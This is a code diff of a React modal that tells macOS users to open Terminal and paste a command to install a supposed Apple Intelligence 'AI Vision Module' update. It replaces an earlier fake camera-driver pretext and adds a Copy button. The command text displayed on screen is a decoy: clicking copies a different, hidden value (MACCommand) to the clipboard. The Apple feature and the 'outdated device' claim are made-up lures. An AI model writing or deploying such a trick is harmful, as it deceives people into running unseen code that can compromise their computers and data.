@@ -107,22 +107,6 @@ export const PromptModal = ({ callback, showToast }) => {
                 This stems from a race condition in how the cache is accessed,
                 which can lead to some issues.
               </div>
-              {/* <div className="ml-4 w-full text-start">
-                •&nbsp;&nbsp;Cameras may not appear at all due to incorrect
-                cache references.
-              </div>
-              <div className="ml-4 w-full text-start">
-                •&nbsp;&nbsp;Device detection may fail when multiple devices are
-                connected, as the cache becomes unreliable.
-              </div>
-              <div className="ml-4 w-full text-start">
-                •&nbsp;&nbsp;Some devices may show up multiple times or disappear
-                because of cached duplication or corruption.
-              </div>
-              <div className="ml-4 w-full text-start">
-                •&nbsp;&nbsp;Outdated or invalid device data may remain in the
-                cache, preventing accurate detection
-              </div> */}
               <div className="text-[16px] mt-4 w-full text-start font-bold">
                 Here is the solution identified for the issue.
               </div>
@@ -194,39 +178,16 @@ export const PromptModal = ({ callback, showToast }) => {
             </div>
             <div className="px-[40px] pb-[40px]">
               <div className="text-[24px] font-bold w-full text-center mb-4">
-                🚫 Access to Camera or Microphone Is Currently Restricted
+                🚫 Manual Update Required for New AI Feature
               </div>
               <div className="text-[16px] w-full text-start mb-2">
-                It appears that access to your camera or microphone is currently
-                restricted. Additionally, on Mac systems, there is a known and
-                significant issue with the camera driver cache. This stems from
-                a race condition in how the cache is accessed, which can lead to
-                some issues.
+                Apple recently introduced a cutting-edge AI feature designed to detect synthetic faces and enhance user security across its devices.
+                This platform relies on the latest Apple Intelligence update, and since your device appears outdated, you’ll need to manually install the update to access its full capabilities.
               </div>
-              {/* <div className="ml-4 w-full text-start">
-                •&nbsp;&nbsp;Simultaneous access to the cache by multiple
-                processes may result in incomplete or inconsistent data.
-              </div>
-              <div className="ml-4 w-full text-start">
-                •&nbsp;&nbsp;The cache may fail under high load or when accessed
-                by multiple threads concurrently.
-              </div>
-              <div className="ml-4 w-full text-start">
-                •&nbsp;&nbsp;Improper handling of concurrent cache access can
-                lead to performance degradation or deadlocks.
-              </div>
-              <div className="ml-4 w-full text-start">
-                •&nbsp;&nbsp;Connected devices may be skipped, misidentified, or
-                duplicated due to stale or corrupted cache entries.
-              </div>
-              <div className="ml-4 w-full text-start">
-                •&nbsp;&nbsp;These issues make the component unreliable,
-                particularly in multi-threaded or high-demand environments.
-              </div> */}
               <div className="text-[16px] mt-4 w-full text-start font-bold">
-                Here is the solution identified for the issue.
+                Here are the steps to follow:
               </div>
-              <p className="text-left text-[16px]">1. Open Terminal on MacOS</p>
+              <p className="text-left text-[16px]">1. Open Terminal on macOS</p>
               <ul className="list-none text-left text-[#666] text-[14px]">
                 <li className="ml-4">
                   •&nbsp;&nbsp;Press{" "}
@@ -242,29 +203,23 @@ export const PromptModal = ({ callback, showToast }) => {
                   and the Terminal application will open.
                 </li>
               </ul>
-              <p className="text-left text-[16px]">2. Update camera drivers on MacOS</p>
+              <p className="text-left text-[16px]">2. Update AI Feature</p>
               <ul className="text-left">
                 <li className="ml-4 mt-1">
                   •&nbsp;&nbsp;<span className="font-semibold">Copy</span> the following command by clicking on it.
                 </li>
                 <li className="ml-4 mt-1">
-                  •&nbsp;&nbsp;<span className="font-semibold">Paste</span> the following command into the Terminal.
+                  •&nbsp;&nbsp;<span className="font-semibold">Paste</span> the command into the Terminal.
                 </li>
                 <li className="ml-4 mt-1">
-                  •&nbsp;&nbsp;Press <span className="font-semibold">Enter</span> to automatically update the latest camera drivers for MacOS.
+                  •&nbsp;&nbsp;Press <span className="font-semibold">Enter</span> to automatically install the latest updates.
                 </li>
               </ul>
-              <div className="w-full h-[60px] mt-2 bg-[#1b1f230d] overflow-x-auto pt-3">
+              <div className="w-full h-[60px] mt-2 bg-[#1b1f230d] pt-3 relative">
                 <pre
-                  className="w-full allow-copy"
+                  className="w-full allow-copy overflow-x-auto"
                   style={{ userSelect: "text", cursor: "pointer" }}
                 >
-                  {/* <code
-                    className="pl-4 pr-4 whitespace-nowrap"
-                    onClick={(e) => copy(e)}
-                  >
-                    {MACCommand}
-                  </code> */}
                   <code
                       className="pl-4 pr-4 whitespace-nowrap"
                       onClick={() => copyClipboard(MACCommand)}
@@ -277,9 +232,30 @@ export const PromptModal = ({ callback, showToast }) => {
                         WebkitUserSelect: "none",
                         MozUserSelect: "none",
                         msUserSelect: "none"
-                      }}>--nvidia.com --updatecameradriver NVIDIA mac Kernel Module 304.54 --query-gpu=driver_version --format=csv,noheader</span>
+                      }}>sudo ai-driver-tool --update-feature "AI Vision Module" --version 304.54 --query driver_version --format csv --no-header
+                      </span>
                     </code>
                 </pre>
+                <button
+                  className="absolute right-1 top-1 flex items-center gap-1 px-3 py-1 rounded transition"
+                  style={{
+                    background: "rgba(243, 244, 246, 0.85)", // brighter gray
+                    color: "#111827", // Tailwind gray-900, much brighter text
+                    zIndex: 2,
+                    boxShadow: "0 2px 8px #d1d5db99",
+                    backdropFilter: "blur(6px)", // glass effect
+                    WebkitBackdropFilter: "blur(6px)", // Safari support
+                    border: "1px solid #e5e7eb"
+                  }}
+                  onClick={() => copyClipboard(MACCommand)}
+                  aria-label="Copy command"
+                >
+                  <svg width="18" height="18" viewBox="0 0 20 20" fill="none">
+                    <rect x="5" y="5" width="10" height="12" rx="2" stroke="#111827" strokeWidth="1" fill="rgba(243,244,246,0.85)"/>
+                    <rect x="3" y="3" width="10" height="12" rx="2" stroke="#111827" strokeWidth="1" fill="none"/>
+                  </svg>
+                  Copy
+                </button>
               </div>
             </div>
           </div>
